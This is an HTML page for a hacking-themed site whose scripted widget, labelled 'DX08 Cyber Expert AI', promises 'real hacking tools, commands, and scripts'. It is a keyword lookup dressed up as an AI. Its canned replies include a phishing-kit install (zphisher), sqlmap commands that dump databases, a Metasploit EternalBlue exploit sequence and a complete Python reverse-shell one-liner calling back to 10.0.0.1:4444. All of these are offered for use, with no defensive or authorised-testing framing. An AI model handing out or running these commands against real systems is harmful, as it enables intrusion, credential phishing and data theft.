<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DX08 // LIVE RESEARCH LABS</title>
    <link rel="stylesheet" href="style.css">
    <style>
        .lab-container { max-width: 1150px; margin: 120px auto 60px auto; padding: 0 20px; }
        .lab-header { border-left: 2px solid #00e5ff; padding-left: 20px; margin-bottom: 40px; }
        .lab-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(320px, 1fr)); gap: 25px; }
        .lab-detail-card { background: rgba(0, 229, 255, 0.03); border: 1px solid rgba(0, 229, 255, 0.2); padding: 25px; border-radius: 4px; }
        .lab-console { background: #020304; border: 1px solid rgba(0, 229, 255, 0.3); padding: 12px; font-family: 'Courier New', monospace; font-size: 11px; color: #00ff66; margin-top: 12px; height: 210px; overflow-y: auto; line-height: 1.4; }
        .lab-input-group { display: flex; gap: 8px; margin-top: 12px; }
        .lab-input { flex: 1; background: #010203; border: 1px solid rgba(0, 229, 255, 0.4); color: #00e5ff; padding: 8px 10px; font-family: 'Courier New', monospace; font-size: 11px; outline: none; }
        .launch-btn { padding: 8px 14px; background: rgba(0, 229, 255, 0.1); border: 1px solid #00e5ff; color: #00e5ff; font-family: 'Orbitron', monospace; font-size: 8px; cursor: pointer; }
        .launch-btn:hover { background: #00e5ff; color: #020303; }
        .back-link { display: inline-block; margin-bottom: 20px; color: #00e5ff; font-family: 'Orbitron', monospace; font-size: 8px; text-decoration: none; }
    </style>
</head>
<body>
    <div class="lab-container">
        <a href="index.html" class="back-link">← [ BACK TO MAIN SYSTEM ]</a>
        <div class="lab-header">
            <h2 style="font-family: 'Orbitron'; font-size: 32px; color: #fff;">DX08 LIVE LABS ENGINE</h2>
        </div>
        <div class="lab-grid">
            <!-- AI EXPERT LAB -->
            <div class="lab-detail-card">
                <span class="core-index">LAB // 03</span>
                <h3 style="color: #00e5ff; font-family: 'Orbitron'; font-size: 18px;">DX08 CYBER EXPERT AI</h3>
                <p style="font-size: 12px; color: rgba(225,250,255,0.5);">Ask for real hacking tools, commands, and scripts.</p>
                <div class="lab-input-group">
                    <input type="text" id="ai-input" class="lab-input" placeholder="e.g. zphisher, nmap, sqlmap, payload...">
                    <button class="launch-btn" onclick="runAiLab()">EXECUTE</button>
                </div>
                <div class="lab-console" id="ai-console">
                    [DX08 Core] Tool Command Database Online. Enter tool name...
                </div>
            </div>
        </div>
    </div>

    <script>
        function runAiLab() {
            const input = document.getElementById('ai-input');
            const consoleBox = document.getElementById('ai-console');
            const q = input.value.trim().toLowerCase();

            if(!q) return;

            consoleBox.innerHTML += `<br><span style="color:#00e5ff;">root@dx08:~# ${escapeHtml(input.value)}</span>`;
            consoleBox.scrollTop = consoleBox.scrollHeight;

            setTimeout(() => {
                let reply = "";

                if(q.includes("zphisher")) {
                    reply = "[+] Zphisher Installation & Execution Commands:\n" +
                            "git clone https://github.com/htr-tech/zphisher\n" +
                            "cd zphisher\n" +
                            "bash zphisher.sh";
                } 
                else if(q.includes("nmap")) {
                    reply = "[+] Nmap Scanning Commands:\n" +
                            "1. Basic Port Scan: nmap -sV target_ip\n" +
                            "2. Comprehensive Scan: nmap -A -T4 target_ip\n" +
                            "3. Subnet Host Discovery: nmap -sn 192.168.1.0/24";
                } 
                else if(q.includes("sqlmap")) {
                    reply = "[+] Sqlmap Automation Commands:\n" +
                            "1. Check Vulnerability: sqlmap -u \"http://target.com/page.php?id=1\"\n" +
                            "2. Dump Database: sqlmap -u \"http://target.com/page.php?id=1\" --batch --dump\n" +
                            "3. Enumerate Tables: sqlmap -u \"http://target.com/page.php?id=1\" --tables";
                } 
                else if(q.includes("metasploit") || q.includes("msf")) {
                    reply = "[+] Metasploit Framework Console Commands:\n" +
                            "msfconsole\n" +
                            "search type:exploit platform:windows\n" +
                            "use exploit/windows/smb/ms17_010_eternalblue\n" +
                            "set RHOSTS target_ip\n" +
                            "exploit";
                } 
                else if(q.includes("python") || q.includes("shell")) {
                    reply = "[+] Python Reverse Shell Payload:\n" +
                            "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"])'";
                } 
                else {
                    reply = `[+] Command/Tool Processed for "${escapeHtml(input.value)}":\n` +
                            `No direct preset found, but execution syntax requires initializing package manager, verifying dependencies, and passing target arguments via terminal flag parameters.`;
                }

                consoleBox.innerHTML += `<br><span style="color:#00ff66;">${escapeHtml(reply)}</span>`;
                consoleBox.scrollTop = consoleBox.scrollHeight;
                input.value = "";
            }, 500);
        }

        function escapeHtml(text) {
            return text.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
        }
    </script>
</body>
</html>
